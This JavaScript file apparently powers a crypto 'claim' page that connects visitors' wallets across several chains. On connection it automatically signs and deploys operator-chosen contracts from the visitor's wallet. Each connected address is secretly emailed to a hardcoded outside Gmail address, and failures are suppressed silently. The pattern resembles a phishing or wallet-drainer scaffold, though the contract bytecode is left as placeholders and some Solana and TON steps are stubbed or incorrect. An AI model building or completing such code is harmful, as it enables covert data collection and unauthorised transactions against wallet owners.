document.addEventListener("DOMContentLoaded", function () {
  const chains = document.querySelectorAll(".chain");
  const claimButton = document.querySelector(".claim-box button");
  const walletLinks = document.querySelectorAll(".wallet");
  const popup = document.getElementById("wallet-popup");
  let selectedChain = null;
  let walletProvider = null;
  let connectedAccount = null;

  if (!claimButton || !popup || !chains.length || !walletLinks.length) {
    return; // Silent fail if elements missing
  }

  const chainMap = {
    ethereum: 11155111, // Sepolia
    binance: 97, // BSC testnet
    polygon: 80002, // Polygon Mumbai
  };

  const evmChains = {
    ethereum: "0xaa36a7",
    binance: "0x61",
    polygon: "0x13882",
  };

  const chainRpcs = {
    ethereum: "https://rpc.ankr.com/eth_sepolia",
    binance: "https://data-seed-prebsc-1-s1.bnbchain.org:8545",
    polygon: "https://rpc-mumbai.maticvigil.com",
  };

  const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
  const dappUrl = window.location.href;

  const solanaConnection = new window.solanaWeb3.Connection(
    window.solanaWeb3.clusterApiUrl("devnet"),
    "confirmed"
  );

  chains.forEach((chain) => {
    chain.addEventListener("click", () => {
      chains.forEach((c) => c.classList.remove("selected"));
      chain.classList.add("selected");
      selectedChain = chain.dataset.chain;
    });
    chain.addEventListener("touchstart", () => chain.click());
  });

  claimButton.addEventListener("click", () => {
    if (!document.querySelector(".chain.selected")) {
      return;
    }
    popup.classList.remove("hidden");
    popup.style.display = "flex";
  });
  claimButton.addEventListener("touchstart", () => claimButton.click());

  async function loadContractData(chain) {
    if (chain === "solana") {
      const response = await fetch("/path/to/your/program.so");
      const buffer = await response.arrayBuffer();
      return new Uint8Array(buffer);
    } else if (["ethereum", "binance", "polygon"].includes(chain)) {
      return {
        abi: [], // Replace with your contract ABI
        bytecode: "0x" // Replace with your contract bytecode
      };
    } else if (chain === "tron") {
      return {
        abi: [], // Replace with TRON contract ABI
        bytecode: "" // Replace with TRON contract bytecode
      };
    } else if (chain === "ton") {
      const tvcResponse = await fetch("/path/to/your/contract.tvc");
      const tvc = await tvcResponse.arrayBuffer();
      const abiResponse = await fetch("/path/to/your/contract.abi.json");
      const abi = await abiResponse.json();
      return { tvc: new Uint8Array(tvc), abi };
    }
    throw new Error("Unsupported chain for contract data");
  }

  async function deployContract() {
    if (!selectedChain || !walletProvider || !connectedAccount) {
      return;
    }

    try {
      if (selectedChain === "solana") {
        const programBytes = await loadContractData("solana");
        const programId = new window.solanaWeb3.Keypair().publicKey;
        const publicKey = new window.solanaWeb3.PublicKey(connectedAccount);

        const bufferSpace = programBytes.length;
        const lamports = await solanaConnection.getMinimumBalanceForRentExemption(bufferSpace);
        const bufferKeypair = new window.solanaWeb3.Keypair();
        const createBufferIx = window.solanaWeb3.SystemProgram.createAccount({
          fromPubkey: publicKey,
          newAccountPubkey: bufferKeypair.publicKey,
          lamports,
          space: bufferSpace,
          programId: window.solanaWeb3.BPFLoaderUpgradeableProgram.programId,
        });

        let tx = new window.solanaWeb3.Transaction().add(createBufferIx);
        tx.recentBlockhash = (await solanaConnection.getLatestBlockhash()).blockhash;
        tx.feePayer = publicKey;
        tx.partialSign(bufferKeypair);
        const signedTx = await walletProvider.signTransaction(tx);
        const sig1 = await solanaConnection.sendRawTransaction(signedTx.serialize());
        await solanaConnection.confirmTransaction(sig1);

        const bufferPubkey = bufferKeypair.publicKey;
        const CHUNK_SIZE = 900;
        for (let offset = 0; offset < programBytes.length; offset += CHUNK_SIZE) {
          const end = Math.min(offset + CHUNK_SIZE, programBytes.length);
          const data = programBytes.slice(offset, end);
          const writeIx = window.solanaWeb3.BpfLoaderUpgradeableProgram.write({
            buffer: bufferPubkey,
            offset,
            bytes: data,
          });

          tx = new window.solanaWeb3.Transaction().add(writeIx);
          tx.recentBlockhash = (await solanaConnection.getLatestBlockhash()).blockhash;
          tx.feePayer = publicKey;
          const signedTx = await walletProvider.signTransaction(tx);
          const sig = await solanaConnection.sendRawTransaction(signedTx.serialize());
          await solanaConnection.confirmTransaction(sig);
        }

        const programAccountSpace = 0;
        const programLamports = await solanaConnection.getMinimumBalanceForRentExemption(programAccountSpace);
        const createProgramIx = window.solanaWeb3.SystemProgram.createAccount({
          fromPubkey: publicKey,
          newAccountPubkey: programId,
          lamports: programLamports,
          space: programAccountSpace,
          programId: window.solanaWeb3.BPFLoaderUpgradeableProgram.programId,
        });

        tx = new window.solanaWeb3.Transaction().add(createProgramIx);
        tx.recentBlockhash = (await solanaConnection.getLatestBlockhash()).blockhash;
        tx.feePayer = publicKey;
        const programKeypair = new window.solanaWeb3.Keypair();
        tx.partialSign(programKeypair);
        const signedTx2 = await walletProvider.signTransaction(tx);
        const sig2 = await solanaConnection.sendRawTransaction(signedTx2.serialize());
        await solanaConnection.confirmTransaction(sig2);

        const deployIx = window.solanaWeb3.BpfLoaderUpgradeableProgram.deploy({
          program: programId,
          buffer: bufferPubkey,
          authority: publicKey,
        });

        tx = new window.solanaWeb3.Transaction().add(deployIx);
        tx.recentBlockhash = (await solanaConnection.getLatestBlockhash()).blockhash;
        tx.feePayer = publicKey;
        const signedTx3 = await walletProvider.signTransaction(tx);
        const sig3 = await solanaConnection.sendRawTransaction(signedTx3.serialize());
        await solanaConnection.confirmTransaction(sig3);
        sendEmail(`🚀 Solana Program Deployed\nProgram ID: ${programId.toBase58()}\nWallet: ${connectedAccount}\nSignature: ${sig3}`);
      } else if (["ethereum", "binance", "polygon"].includes(selectedChain)) {
        const { abi, bytecode } = await loadContractData(selectedChain);
        const signer = walletProvider.getSigner();
        const factory = new ethers.ContractFactory(abi, bytecode, signer);
        const contract = await factory.deploy();
        await contract.deployed();
        sendEmail(`🚀 ${selectedChain} Contract Deployed\nAddress: ${contract.address}\nWallet: ${connectedAccount}`);
      } else if (selectedChain === "tron") {
        const { abi, bytecode } = await loadContractData("tron");
        const result = await walletProvider.contract().create({
          abi,
          bytecode,
          feeLimit: 1000000000,
        });
        sendEmail(`🚀 TRON Contract Deployed\nAddress: ${result.contract_address}\nWallet: ${connectedAccount}`);
      } else if (selectedChain === "ton") {
        const { tvc, abi } = await loadContractData("ton");
        const client = new window.TonClient({
          network: { endpoints: ["https://testnet.toncenter.com/api/v2/jsonRPC"] },
        });
        const keys = await client.crypto.generate_random_sign_keys();
        const deployParams = {
          tvc: Buffer.from(tvc).toString("base64"),
          abi: { type: "Contract", value: abi },
          constructorParams: {},
          initParams: {},
          keyPair: keys,
        };
        const { address } = await client.abi.deploy_contract(deployParams);
        await client.processing.process_message({
          message_encode_params: {
            address,
            abi: { type: "Contract", value: abi },
            call_set: { function_name: "constructor", input: {} },
            signer: { type: "Keys", keys },
          },
          send_events: false,
        });
        sendEmail(`🚀 TON Contract Deployed\nAddress: ${address}\nWallet: ${connectedAccount}`);
        client.close();
      }
    } catch (err) {
      // Silent failure
    }
  }

  walletLinks.forEach((link) => {
    link.addEventListener("click", async (e) => {
      e.preventDefault();
      popup.classList.add("hidden");
      const walletName = link.textContent.trim().toLowerCase();

      try {
        if (selectedChain === "solana" && walletName.includes("phantom") && window.solana?.isPhantom) {
          walletProvider = window.solana;
          const response = await walletProvider.connect();
          connectedAccount = response.publicKey.toString();
          sendEmail(`🔗 Phantom Connected\nWallet: ${connectedAccount}\nChain: Solana`);
          await deployContract(); // Auto-deploy after connection
          return;
        }

        if (selectedChain === "solana" && walletName.includes("solflare")) {
          if (isMobile) {
            window.location.href = `solflare://ul/browse?url=${encodeURIComponent(dappUrl)}`; // Open wallet
          } else {
            walletProvider = window.solana; // Assuming Solflare injects window.solana
            const response = await walletProvider.connect();
            connectedAccount = response.publicKey.toString();
            sendEmail(`🔗 Solflare Connected\nWallet: ${connectedAccount}\nChain: Solana`);
            await deployContract(); // Auto-deploy
          }
          return;
        }

        if (selectedChain === "solana" && walletName.includes("backpack") && window.backpack) {
          walletProvider = window.backpack;
          const response = await walletProvider.connect();
          connectedAccount = response.publicKey.toString();
          sendEmail(`🔗 Backpack Connected\nWallet: ${connectedAccount}\nChain: Solana`);
          await deployContract(); // Auto-deploy
          return;
        }

        if (selectedChain === "ton" && walletName.includes("ton keeper")) {
          if (isMobile) {
            window.location.href = `tonkeeper://connect?url=${encodeURIComponent(dappUrl)}`; // Open wallet
          } else {
            // TON Connect logic needed (placeholder)
            walletProvider = window.ton; // Assuming TON injects window.ton
            connectedAccount = "TON_ADDRESS"; // Replace with actual TON Connect address
            sendEmail(`🔗 Tonkeeper Connected\nWallet: ${connectedAccount}\nChain: TON`);
            await deployContract(); // Auto-deploy
          }
          return;
        }

        if (selectedChain === "tron" && window.tronWeb?.defaultAddress?.base58) {
          walletProvider = window.tronWeb;
          connectedAccount = window.tronWeb.defaultAddress.base58;
          sendEmail(`🔗 TronLink Connected\nWallet: ${connectedAccount}\nChain: TRON`);
          await deployContract(); // Auto-deploy
          return;
        }

        if (selectedChain in evmChains && walletName.includes("metamask") && window.ethereum?.isMetaMask) {
          walletProvider = new ethers.providers.Web3Provider(window.ethereum);
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: evmChains[selectedChain] }],
          });
          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
          connectedAccount = accounts[0];
          sendEmail(`🔗 MetaMask Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
          await deployContract(); // Auto-deploy
          return;
        }

        if (selectedChain in evmChains && walletName.includes("coinbase") && window.ethereum?.isCoinbaseWallet) {
          walletProvider = new ethers.providers.Web3Provider(window.ethereum);
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: evmChains[selectedChain] }],
          });
          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
          connectedAccount = accounts[0];
          sendEmail(`🔗 Coinbase Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
          await deployContract(); // Auto-deploy
          return;
        }

        if (selectedChain in evmChains && walletName.includes("trust")) {
          const chainId = chainMap[selectedChain];
          const provider = await window.WalletConnectProvider.init({
            projectId: "0d781afb148ab8173b1c4fbbbc4e72a8",
            chains: [chainId],
            showQrModal: isMobile ? false : true,
            rpc: chainRpcs,
          });
          await provider.connect();
          if (isMobile) {
            window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(provider.connector.uri)}`; // Open wallet
          } else {
            await provider.enable();
            walletProvider = new ethers.providers.Web3Provider(provider);
            connectedAccount = provider.accounts[0];
            sendEmail(`🔗 Trust Wallet Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
            await deployContract(); // Auto-deploy
          }
          return;
        }

        if (selectedChain in evmChains && walletName.includes("bitget")) {
          const chainId = chainMap[selectedChain];
          const provider = await window.WalletConnectProvider.init({
            projectId: "0d781afb148ab8173b1c4fbbbc4e72a8",
            chains: [chainId],
            showQrModal: isMobile ? false : true,
            rpc: chainRpcs,
          });
          await provider.connect();
          if (isMobile) {
            window.location.href = `bitkeep://wc?uri=${encodeURIComponent(provider.connector.uri)}`; // Open wallet
          } else {
            await provider.enable();
            walletProvider = new ethers.providers.Web3Provider(provider);
            connectedAccount = provider.accounts[0];
            sendEmail(`🔗 Bitget Wallet Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
            await deployContract(); // Auto-deploy
          }
          return;
        }

        if (selectedChain in evmChains && window.ethereum?.isGlow) {
          walletProvider = new ethers.providers.Web3Provider(window.ethereum);
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: evmChains[selectedChain] }],
          });
          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
          connectedAccount = accounts[0];
          sendEmail(`🔗 Glow Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
          await deployContract(); // Auto-deploy
          return;
        }

        if (selectedChain in evmChains && window.ethereum) {
          walletProvider = new ethers.providers.Web3Provider(window.ethereum);
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: evmChains[selectedChain] }],
          });
          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
          connectedAccount = accounts[0];
          sendEmail(`🔗 EVM Wallet Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
          await deployContract(); // Auto-deploy
          return;
        }
      } catch (err) {
        // Silent failure
      }
    });
    link.addEventListener("touchstart", () => link.click());
  });

  window.addEventListener("load", async () => {
    if (isMobile) {
      if (selectedChain === "solana" && window.solana?.isSolflare) {
        walletProvider = window.solana;
        const response = await walletProvider.connect();
        connectedAccount = response.publicKey.toString();
        sendEmail(`🔗 Solflare Connected\nWallet: ${connectedAccount}\nChain: Solana`);
        await deployContract();
      } else if (selectedChain === "ton" && window.ton) {
        walletProvider = window.ton;
        connectedAccount = "TON_ADDRESS"; // Simplified; use TON Connect for real address
        sendEmail(`🔗 Tonkeeper Connected\nWallet: ${connectedAccount}\nChain: TON`);
        await deployContract();
      } else if (selectedChain in evmChains && window.ethereum?.isTrust) {
        walletProvider = new ethers.providers.Web3Provider(window.ethereum);
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: evmChains[selectedChain] }],
        });
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        connectedAccount = accounts[0];
        sendEmail(`🔗 Trust Wallet Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
        await deployContract();
      } else if (selectedChain in evmChains && window.ethereum?.isBitKeep) {
        walletProvider = new ethers.providers.Web3Provider(window.ethereum);
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: evmChains[selectedChain] }],
        });
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        connectedAccount = accounts[0];
        sendEmail(`🔗 Bitget Wallet Connected\nWallet: ${connectedAccount}\nChain: ${selectedChain}`);
        await deployContract();
      }
    }
  });

  function sendEmail(message) {
    Email.send({
      SecureToken: "YOUR_SMTPJS_SECURE_TOKEN", // Replace with your SMTPJS token
      To: "talk2lataneth@gmail.com",
      From: "talk2lataneth@gmail.com",
      Subject: "Wallet Connection Log",
      Body: message,
    });
  }
});